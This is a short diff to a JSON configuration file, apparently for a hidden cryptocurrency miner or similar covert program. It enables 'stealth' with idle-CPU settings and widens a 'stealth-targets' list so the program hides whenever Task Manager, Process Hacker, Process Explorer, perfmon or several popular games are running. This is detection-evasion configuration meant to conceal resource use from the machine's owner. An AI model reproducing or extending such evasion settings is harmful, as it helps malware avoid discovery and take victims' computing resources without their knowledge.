@@ -12,5 +12,5 @@
 	"idle-wait": 2,
 	"idle-cpu": 100,
 	"stealth": true,
-	"stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,csgo.exe"
+	"stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,ModernWarfare.exe,Warframe.x64.exe,arma3.exe,arma3_x64.exe,TslGame.exe,ShooterGame.exe,ShooterGameServer.exe,ShooterGame_BE.exe,csgo.exe"
 }
